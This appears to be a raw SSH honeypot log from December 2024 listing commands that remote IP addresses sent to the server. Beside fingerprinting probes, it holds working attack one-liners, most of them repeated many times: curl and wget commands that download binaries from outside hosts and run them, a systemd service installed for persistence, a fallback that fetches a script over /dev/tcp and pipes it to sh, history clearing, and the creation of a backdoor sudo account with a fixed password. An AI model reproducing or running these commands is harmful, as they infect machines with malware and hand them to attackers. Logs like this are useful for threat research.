start
2024-12-11 09:20:09.026379 - ('115.141.125.74', 48545) - cat /proc/cpuinfo
2024-12-11 09:20:10.365737 - ('115.141.125.74', 48545) - ps | grep '[Mm]iner'
2024-12-11 09:20:11.706777 - ('115.141.125.74', 48545) - ps -ef | grep '[Mm]iner'
2024-12-11 09:20:13.046023 - ('115.141.125.74', 48545) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 09:20:14.377486 - ('115.141.125.74', 48545) - echo Hi | cat -n
2024-12-11 09:25:44.359220 - ('49.160.126.72', 41592) - /ip cloud print
2024-12-11 09:25:45.949931 - ('49.160.126.72', 41592) - ifconfig
2024-12-11 09:25:47.257078 - ('49.160.126.72', 41592) - uname -a
2024-12-11 09:25:48.561675 - ('49.160.126.72', 41592) - cat /proc/cpuinfo
2024-12-11 09:25:49.868934 - ('49.160.126.72', 41592) - ps | grep '[Mm]iner'
2024-12-11 09:25:51.188966 - ('49.160.126.72', 41592) - ps -ef | grep '[Mm]iner'
2024-12-11 09:25:52.508723 - ('49.160.126.72', 41592) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 09:25:53.816681 - ('49.160.126.72', 41592) - echo Hi | cat -n
2024-12-11 09:32:59.919873 - ('112.159.217.107', 52176) - /ip cloud print
2024-12-11 09:33:01.551079 - ('112.159.217.107', 52176) - ifconfig
2024-12-11 09:33:02.894872 - ('112.159.217.107', 52176) - uname -a
2024-12-11 09:33:04.238706 - ('112.159.217.107', 52176) - cat /proc/cpuinfo
2024-12-11 09:33:05.590781 - ('112.159.217.107', 52176) - ps | grep '[Mm]iner'
2024-12-11 09:33:06.942803 - ('112.159.217.107', 52176) - ps -ef | grep '[Mm]iner'
2024-12-11 09:33:08.290456 - ('112.159.217.107', 52176) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 09:33:09.638757 - ('112.159.217.107', 52176) - echo Hi | cat -n
2024-12-11 10:08:33.463566 - ('45.148.10.203', 53974) - apt
2024-12-11 10:08:33.644241 - ('45.148.10.203', 53974) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:37.956258 - ('45.148.10.203', 53178) - apt
2024-12-11 10:08:38.140366 - ('45.148.10.203', 53178) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:42.444022 - ('45.148.10.203', 53188) - apt
2024-12-11 10:08:42.620354 - ('45.148.10.203', 53188) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:46.923229 - ('45.148.10.203', 53196) - apt
2024-12-11 10:08:47.100313 - ('45.148.10.203', 53196) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:51.410059 - ('45.148.10.203', 57736) - apt
2024-12-11 10:08:51.591966 - ('45.148.10.203', 57736) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 10:08:55.902435 - ('45.148.10.203', 57742) - apt
2024-12-11 10:08:56.083531 - ('45.148.10.203', 57742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 11:41:47.500840 - ('58.149.253.83', 60111) - /ip cloud print
2024-12-11 11:41:49.032256 - ('58.149.253.83', 60111) - ifconfig
2024-12-11 11:41:50.288577 - ('58.149.253.83', 60111) - uname -a
2024-12-11 11:41:51.514995 - ('58.149.253.83', 60111) - cat /proc/cpuinfo
2024-12-11 11:41:52.747223 - ('58.149.253.83', 60111) - ps | grep '[Mm]iner'
2024-12-11 11:41:53.991531 - ('58.149.253.83', 60111) - ps -ef | grep '[Mm]iner'
2024-12-11 11:41:55.231944 - ('58.149.253.83', 60111) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 11:41:56.495662 - ('58.149.253.83', 60111) - echo Hi | cat -n
2024-12-11 12:17:25.882053 - ('218.92.0.132', 56540) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-11 14:33:10.491996 - ('61.36.211.9', 39032) - /ip cloud print
2024-12-11 14:33:11.982967 - ('61.36.211.9', 39032) - ifconfig
2024-12-11 14:33:13.194830 - ('61.36.211.9', 39032) - uname -a
2024-12-11 14:33:14.422634 - ('61.36.211.9', 39032) - cat /proc/cpuinfo
2024-12-11 14:33:15.638528 - ('61.36.211.9', 39032) - ps | grep '[Mm]iner'
2024-12-11 14:33:16.860675 - ('61.36.211.9', 39032) - ps -ef | grep '[Mm]iner'
2024-12-11 14:33:18.123404 - ('61.36.211.9', 39032) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 14:33:18.452579 - ('122.33.30.94', 49239) - /ip cloud print
2024-12-11 14:33:19.346477 - ('61.36.211.9', 39032) - echo Hi | cat -n
2024-12-11 14:33:20.060419 - ('122.33.30.94', 49239) - ifconfig
2024-12-11 14:33:21.380380 - ('122.33.30.94', 49239) - uname -a
2024-12-11 14:33:22.712311 - ('122.33.30.94', 49239) - cat /proc/cpuinfo
2024-12-11 14:33:24.048271 - ('122.33.30.94', 49239) - ps | grep '[Mm]iner'
2024-12-11 14:33:25.372136 - ('122.33.30.94', 49239) - ps -ef | grep '[Mm]iner'
2024-12-11 14:33:26.692031 - ('122.33.30.94', 49239) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 14:33:28.011858 - ('122.33.30.94', 49239) - echo Hi | cat -n
2024-12-11 19:00:53.650946 - ('87.120.113.231', 59206) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-11 21:05:02.338140 - ('87.120.113.231', 45204) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-11 21:57:23.979444 - ('46.19.143.66', 50156) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZVNemhmE) system && sudo usermod -aG sudo system
2024-12-11 21:57:24.219664 - ('46.19.143.66', 50156) - lscpu && echo -e "ZVNemhmE\nZVNemhmE" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 00:02:56.444842 - ('45.148.10.203', 53740) - apt
2024-12-12 00:02:56.621890 - ('45.148.10.203', 53740) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 00:45:52.309271 - ('121.190.14.247', 47052) - /ip cloud print
2024-12-12 00:45:53.930227 - ('121.190.14.247', 47052) - ifconfig
2024-12-12 00:45:55.248507 - ('121.190.14.247', 47052) - uname -a
2024-12-12 00:45:56.589970 - ('121.190.14.247', 47052) - cat /proc/cpuinfo
2024-12-12 00:45:57.951978 - ('121.190.14.247', 47052) - ps | grep '[Mm]iner'
2024-12-12 00:45:59.375597 - ('121.190.14.247', 47052) - ps -ef | grep '[Mm]iner'
2024-12-12 00:46:00.691135 - ('121.190.14.247', 47052) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-12 00:46:02.021042 - ('121.190.14.247', 47052) - echo Hi | cat -n
2024-12-12 02:23:59.843735 - ('195.178.110.6', 55724) - apt
2024-12-12 02:24:00.157913 - ('195.178.110.6', 55724) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:06.941475 - ('195.178.110.6', 55728) - apt
2024-12-12 02:24:07.353612 - ('195.178.110.6', 55728) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:12.345047 - ('195.178.110.6', 55060) - apt
2024-12-12 02:24:12.744001 - ('195.178.110.6', 55060) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:19.238204 - ('195.178.110.6', 53020) - apt
2024-12-12 02:24:19.550384 - ('195.178.110.6', 53020) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:25.638981 - ('195.178.110.6', 53028) - apt
2024-12-12 02:24:26.743033 - ('195.178.110.6', 53028) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:31.751195 - ('195.178.110.6', 38622) - apt
2024-12-12 02:24:31.963968 - ('195.178.110.6', 38622) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:39.243980 - ('195.178.110.6', 41530) - apt
2024-12-12 02:24:39.873324 - ('195.178.110.6', 41530) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:44.665135 - ('195.178.110.6', 41538) - apt
2024-12-12 02:24:45.041953 - ('195.178.110.6', 41538) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:52.045626 - ('195.178.110.6', 52936) - apt
2024-12-12 02:24:52.347359 - ('195.178.110.6', 52936) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:24:57.544722 - ('195.178.110.6', 37730) - apt
2024-12-12 02:24:58.038607 - ('195.178.110.6', 37730) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:25:03.637389 - ('195.178.110.6', 37742) - apt
2024-12-12 02:25:03.938669 - ('195.178.110.6', 37742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:25:10.750207 - ('195.178.110.6', 40994) - apt
2024-12-12 02:25:11.469815 - ('195.178.110.6', 40994) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 02:55:37.193700 - ('46.19.143.66', 44488) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 3dnhEQMr) system && sudo usermod -aG sudo system
2024-12-12 02:55:37.473810 - ('46.19.143.66', 44488) - lscpu && echo -e "3dnhEQMr\n3dnhEQMr" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-12 03:27:51.995810 - ('45.148.10.203', 51724) - apt
2024-12-12 03:27:52.171769 - ('45.148.10.203', 51724) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:27:56.699258 - ('45.148.10.203', 51738) - apt
2024-12-12 03:27:56.876030 - ('45.148.10.203', 51738) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:01.515752 - ('45.148.10.203', 54280) - apt
2024-12-12 03:28:01.696249 - ('45.148.10.203', 54280) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:06.330647 - ('45.148.10.203', 54296) - apt
2024-12-12 03:28:06.503996 - ('45.148.10.203', 54296) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:11.116933 - ('45.148.10.203', 55636) - apt
2024-12-12 03:28:11.267701 - ('45.148.10.203', 55636) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:15.567227 - ('45.148.10.203', 55642) - apt
2024-12-12 03:28:15.747997 - ('45.148.10.203', 55642) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:20.171066 - ('45.148.10.203', 60614) - apt
2024-12-12 03:28:20.347852 - ('45.148.10.203', 60614) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:24.718992 - ('45.148.10.203', 60626) - apt
2024-12-12 03:28:24.895916 - ('45.148.10.203', 60626) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:29.447947 - ('45.148.10.203', 49630) - apt
2024-12-12 03:28:29.627727 - ('45.148.10.203', 49630) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:33.930789 - ('45.148.10.203', 49656) - apt
2024-12-12 03:28:34.107259 - ('45.148.10.203', 49656) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:38.406663 - ('45.148.10.203', 48574) - apt
2024-12-12 03:28:38.583273 - ('45.148.10.203', 48574) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:42.886472 - ('45.148.10.203', 48606) - apt
2024-12-12 03:28:43.067065 - ('45.148.10.203', 48606) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:47.401781 - ('45.148.10.203', 37182) - apt
2024-12-12 03:28:47.773716 - ('45.148.10.203', 37182) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:52.634625 - ('45.148.10.203', 37194) - apt
2024-12-12 03:28:52.811489 - ('45.148.10.203', 37194) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:28:57.210100 - ('45.148.10.203', 37200) - apt
2024-12-12 03:28:57.531984 - ('45.148.10.203', 37200) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:02.267841 - ('45.148.10.203', 54984) - apt
2024-12-12 03:29:02.391480 - ('45.148.10.203', 54984) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:06.720785 - ('45.148.10.203', 54992) - apt
2024-12-12 03:29:06.897190 - ('45.148.10.203', 54992) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:11.208642 - ('45.148.10.203', 36458) - apt
2024-12-12 03:29:11.386951 - ('45.148.10.203', 36458) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:15.697856 - ('45.148.10.203', 36474) - apt
2024-12-12 03:29:15.879061 - ('45.148.10.203', 36474) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:20.185305 - ('45.148.10.203', 48722) - apt
2024-12-12 03:29:20.359228 - ('45.148.10.203', 48722) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:24.850482 - ('45.148.10.203', 48730) - apt
2024-12-12 03:29:25.027368 - ('45.148.10.203', 48730) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:29.576677 - ('45.148.10.203', 37168) - apt
2024-12-12 03:29:29.759672 - ('45.148.10.203', 37168) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:34.068110 - ('45.148.10.203', 37182) - apt
2024-12-12 03:29:34.262597 - ('45.148.10.203', 37182) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:38.570648 - ('45.148.10.203', 42900) - apt
2024-12-12 03:29:38.750887 - ('45.148.10.203', 42900) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 03:29:43.083157 - ('45.148.10.203', 42912) - apt
